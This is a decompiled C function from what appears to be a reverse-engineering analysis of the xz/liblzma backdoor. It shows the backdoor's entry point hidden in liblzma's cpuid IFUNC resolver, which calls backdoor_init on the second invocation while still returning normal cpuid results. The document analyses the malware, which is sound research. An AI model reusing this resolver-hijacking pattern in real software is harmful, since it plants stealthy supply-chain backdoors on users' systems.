// /home/kali/xzre-ghidra/xzregh/10A720_backdoor_entry.c
// Function: backdoor_entry @ 0x10A720
// Calling convention: __stdcall
// Prototype: uint __stdcall backdoor_entry(uint cpuid_request, u64 * caller_frame)


/*
 * AutoDoc: Executes inside liblzma's IFUNC resolver, counting invocations and calling `backdoor_init` on the second pass. This turns the seemingly harmless cpuid resolver into the backdoor's bootstrap path.
 */
#include "xzre_types.h"


uint backdoor_entry(uint cpuid_request,u64 *caller_frame)

{
  elf_entry_ctx_t state;
  u32 d;
  u32 a;
  u32 b;
  u32 c;
  elf_entry_ctx_t local_48;
  
  if (resolver_call_count == 1) {
    local_48.symbol_ptr = (void *)0x1;
    local_48.got_ctx.got_ptr = (void *)0x0;
    local_48.got_ctx.return_address = (void *)0x0;
    local_48.got_ctx.cpuid_fn = (void *)0x0;
    local_48.got_ctx.got_offset = 0;
    local_48.frame_address = caller_frame;
    backdoor_init(&local_48,caller_frame);
  }
  resolver_call_count = resolver_call_count + 1;
  _cpuid_gcc(cpuid_request,&a,&b,&c,(uint *)&local_48);
  return a;
}

